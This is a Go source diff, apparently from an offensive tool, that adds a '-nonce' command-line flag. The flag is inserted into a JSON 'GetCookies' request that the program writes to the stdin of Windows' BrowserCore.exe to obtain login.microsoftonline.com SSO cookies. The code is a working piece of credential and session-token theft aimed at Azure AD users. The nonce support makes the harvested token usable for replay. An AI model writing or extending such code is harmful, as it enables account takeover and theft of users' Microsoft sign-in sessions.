@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"encoding/binary"
 	"io/ioutil"
+	"flag"
 )
 
 func checkFiles() (string,bool) {
@@ -25,6 +26,16 @@ func checkFiles() (string,bool) {
 }
 
 func main(){
+	// set nonce flag
+	CmdArgs := os.Args[1:]
+	noncePtr := flag.String("nonce","","set nonce")
+	flag.Parse()
+	if len(CmdArgs) < 1 {
+        	fmt.Println("[*] Usage")
+        	flag.PrintDefaults()
+        	os.Exit(0)
+    	}
+	nonce := *noncePtr
 	targetFile,errorBool := checkFiles()
 	if errorBool == false{
 		log.Fatal("BrowserCore.exe File not Found!")
@@ -36,7 +47,7 @@ func main(){
 	browserCmdOut ,_ := browserCmd.StdoutPipe()
 	browserCmd.Start()
 	// adding nonce support tommorow \"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce={nonce}\","
-	stuff := "{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize\",\"sender\":\"https://login.microsoftonline.com\"}"
+	stuff := fmt.Sprintf("{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s\",\"sender\":\"https://login.microsoftonline.com\"}",nonce)
 	fmt.Println("Sending json to process stdin => ",stuff)
 	stuffLen := len(stuff)
 	b := make([]byte, 4)
